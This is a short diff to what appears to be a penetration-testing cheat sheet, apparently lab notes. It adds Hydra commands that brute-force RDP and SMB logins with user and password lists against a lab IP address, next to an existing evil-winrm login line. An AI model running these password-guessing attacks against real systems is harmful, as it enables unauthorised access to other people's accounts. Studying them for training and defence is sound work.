@@ -134,5 +134,10 @@ sudo apt-get -y install netexec
 sudo gem install evil-winrm
 evil-winrm -i <target-IP> -u <username> -p <password>
 
+# Hydra RDP
+hydra -L user.list -P password.list rdp://10.129.42.197
+
+# Hydra SMB
+hydra -L user.list -P password.list smb://10.129.42.197
 
 ```
